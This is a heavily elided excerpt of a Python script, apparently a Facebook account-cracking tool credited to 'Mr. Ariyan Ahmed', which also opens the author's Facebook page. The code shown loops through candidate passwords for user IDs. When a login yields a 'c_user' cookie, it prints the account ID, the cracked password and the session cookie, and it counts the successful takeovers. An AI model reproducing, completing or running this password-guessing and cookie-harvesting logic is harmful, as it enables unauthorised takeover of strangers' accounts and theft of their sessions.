...
os.system('xdg-open https://www.facebook.com/ariyanahmed6402?mibextid=ZbWKwL/')
...
║Author   : 𝙈𝙧. Ariyan Ahmed

║YouTube   : Ariyan Ahmed 

║Facebook :Ariyan  Ahmed
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[ARIYAN-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
        ...
        sys.stdout.write(f'\r\r%s{x}[{xr}ARIYAN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
